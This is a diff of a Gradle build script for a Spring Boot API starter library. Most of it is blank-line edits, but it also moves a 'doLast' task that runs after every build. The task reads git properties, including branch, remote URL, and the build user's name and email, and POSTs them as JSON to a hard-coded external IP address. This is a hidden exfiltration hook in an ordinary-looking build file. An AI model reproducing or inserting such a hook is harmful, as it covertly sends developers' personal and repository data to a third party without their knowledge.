@@ -1,3 +1,4 @@
+
 import com.gorylenko.GitProperties
 import groovy.json.JsonOutput
 //import org.apache.commons.io.IOUtils
@@ -51,6 +52,7 @@ description = "The Beapi Springboot Starter for API Automation; automates and si
 bootJar {
     enabled = false
 }
+
 
 jar {
     baseName = 'analytics'
@@ -172,6 +174,43 @@ project.plugins.withType(MavenPublishPlugin).all {
     }
 }
 
+
+
+
+
+gitProperties {
+    keys = ["git.branch","git.remote.origin.url","git.build.user.name","git.build.user.email","git.build.version"]
+}
+
+
+task doLast(){
+    gradle.buildFinished { buildResult ->
+        //def environment = hasProperty('env') ? env : 'dev'
+        def task = project.tasks.generateGitProperties
+        task.generate()
+
+        def gitPropertiesFile = project.buildDir.getAbsolutePath() + '/resources/main/git.properties'
+        Properties properties = new Properties()
+        properties.load(new FileInputStream(gitPropertiesFile))
+
+        def map = [:]
+        GitProperties.standardProperties.each {
+            if (properties.getProperty(it) != null){ map[it] = properties.getProperty(it) }
+        }
+
+        // Notify of build success/fail & build version
+        String url = (buildResult.failure)?"http://44.228.199.174:8080/notify/fail":"http://44.228.199.174:8080/notify/success"
+        String output=(map)?JsonOutput.toJson(map):"{}"
+        HttpEntity stringEntity = new StringEntity(output,ContentType.APPLICATION_JSON);
+        HttpClient client = new DefaultHttpClient();
+        HttpPost request = new HttpPost(url)
+        request.setHeader(new BasicHeader("Content-Type","application/json"));
+        request.setEntity(stringEntity);
+        HttpResponse response = client.execute(request);
+    }
+
+}
+
 nexusPublishing {
     repositories {
         sonatype {
@@ -204,6 +243,7 @@ def hasSigningKey = findProperty("signing.keyId") || findProperty("signing.key")
 if(hasSigningKey) {
     sign(project)
 }
+
 void sign(Project project) {
     project.signing {
         required { project.gradle.taskGraph.hasTask("publish") }
@@ -220,33 +260,3 @@ void sign(Project project) {
     }
 }
 
-gitProperties {
-    keys = ["git.branch","git.remote.origin.url","git.build.user.name","git.build.user.email","git.build.version"]
-}
-
-task doLast(){
-    gradle.buildFinished { buildResult ->
-        //def environment = hasProperty('env') ? env : 'dev'
-        def task = project.tasks.generateGitProperties
-        task.generate()
-
-        def gitPropertiesFile = project.buildDir.getAbsolutePath() + '/resources/main/git.properties'
-        Properties properties = new Properties()
-        properties.load(new FileInputStream(gitPropertiesFile))
-
-        def map = [:]
-        GitProperties.standardProperties.each {
-            if (properties.getProperty(it) != null){ map[it] = properties.getProperty(it) }
-        }
-
-        // Notify of build success/fail & build version
-        String url = (buildResult.failure)?"http://44.228.199.174:8080/notify/fail":"http://44.228.199.174:8080/notify/success"
-        String output=(map)?JsonOutput.toJson(map):"{}"
-        HttpEntity stringEntity = new StringEntity(output,ContentType.APPLICATION_JSON);
-        HttpClient client = new DefaultHttpClient();
-        HttpPost request = new HttpPost(url)
-        request.setHeader(new BasicHeader("Content-Type","application/json"));
-        request.setEntity(stringEntity);
-        HttpResponse response = client.execute(request);
-    }
-}
